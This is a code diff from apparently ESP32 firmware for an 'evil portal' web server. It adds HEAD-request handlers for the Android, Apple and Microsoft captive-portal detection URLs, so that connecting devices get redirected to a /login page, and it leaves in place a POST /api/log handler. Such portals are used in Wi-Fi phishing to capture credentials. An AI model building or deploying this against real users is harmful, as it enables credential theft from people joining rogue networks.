@@ -736,18 +736,12 @@ httpd_handle_t start_portal_webserver(void) {
     if (httpd_start(&evilportal_server, &config) == ESP_OK) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
-        httpd_uri_t portal_uri_android = {.uri = "/generate_204",
-                                          .method = HTTP_GET,
-                                          .handler = captive_portal_redirect_handler,
-                                          .user_ctx = NULL};
-        httpd_uri_t portal_uri_apple = {.uri = "/hotspot-detect.html",
-                                        .method = HTTP_GET,
-                                        .handler = captive_portal_redirect_handler,
-                                        .user_ctx = NULL};
-        httpd_uri_t microsoft_uri = {.uri = "/connecttest.txt",
-                                     .method = HTTP_GET,
-                                     .handler = captive_portal_redirect_handler,
-                                     .user_ctx = NULL};
+        httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
@@ -760,10 +754,13 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_html = {
             .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
-        httpd_register_uri_handler(evilportal_server, &portal_uri_apple);
+        httpd_register_uri_handler(evilportal_server, &portal_android_get);
+        httpd_register_uri_handler(evilportal_server, &portal_android_head);
+        httpd_register_uri_handler(evilportal_server, &portal_apple_get);
+        httpd_register_uri_handler(evilportal_server, &portal_apple_head);
+        httpd_register_uri_handler(evilportal_server, &microsoft_get);
+        httpd_register_uri_handler(evilportal_server, &microsoft_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
-        httpd_register_uri_handler(evilportal_server, &portal_uri_android);
-        httpd_register_uri_handler(evilportal_server, &microsoft_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
